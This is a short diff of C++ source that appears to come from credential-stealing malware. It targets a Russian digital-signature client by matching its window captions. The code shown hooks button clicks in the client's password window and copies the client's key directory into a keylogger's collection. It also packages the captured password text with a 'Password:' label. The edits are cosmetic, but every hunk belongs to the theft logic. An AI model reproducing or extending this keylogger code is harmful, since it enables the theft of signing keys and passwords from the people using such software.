@@ -24,7 +24,7 @@ namespace InistWeb
 	char InistSystemName[] = "inist";
 
 	PCHAR InistCaptions[] = {
-		"Pегистрация пользователя",
+		"*егистрация пользователя*",
 		"Подпись данных",
 		"Подпись и шифрование",
 		NULL};
@@ -144,14 +144,12 @@ namespace InistWeb
 			Valid = SizeFolderLess(Path, 1024*1024*5, &FolderSize);
         }
 
-
 		if (Valid)
 		{
 			KeyLogger::AddDirectory(Path, "Keys");
 		}
+
 		STR::Free(Path);
-
-
 
 		PKeyLogger L = KeyLogger::GetKeyLogger();
 		if (L != NULL)
@@ -159,7 +157,7 @@ namespace InistWeb
 			PCHAR S = KLGPacker::GetTextDataFromFile(L->FileName, PassWnd);
 
 			PCHAR LB = "\r\n";
-			PCHAR Pass = "Password:";
+			PCHAR Pass = "Password: ";
 
 			PCHAR Buf = STR::New(5, LB, LB, Pass, S, LB);
 
@@ -175,9 +173,9 @@ namespace InistWeb
 
   	//------------------------------------------------------------------------
 
+	// Функия обработки сообщения
 	void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
 	{
-		// Функия обработки сообщения
 		if (Msg->message == WM_LBUTTONUP)
 		{
 			// Отлавливаем нажатие пользователя на кнопке Ok
